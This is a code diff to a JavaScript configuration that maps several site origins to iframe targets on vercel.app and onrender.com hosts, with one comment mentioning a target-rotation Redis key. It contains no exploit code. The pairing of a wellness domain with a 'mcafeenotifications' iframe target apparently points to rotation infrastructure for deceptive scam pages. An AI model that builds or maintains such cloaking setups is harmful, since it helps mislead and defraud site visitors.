@@ -95,8 +95,8 @@ const ORIGIN_GROUPS = {
   },
   dmc: {
     // "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://n-rand.vercel.app", redisKey: "rotation:target_url" },
-    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://h-you.vercel.app" },
-    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://h-you.vercel.app" },
+    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://web-os1.vercel.app" },
+    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://web-os1.vercel.app" },
   },
   aomine: {
     "https://zen-hawellness.life": { method: "iframe", target: "https://mcafeenotifications.onrender.com" },
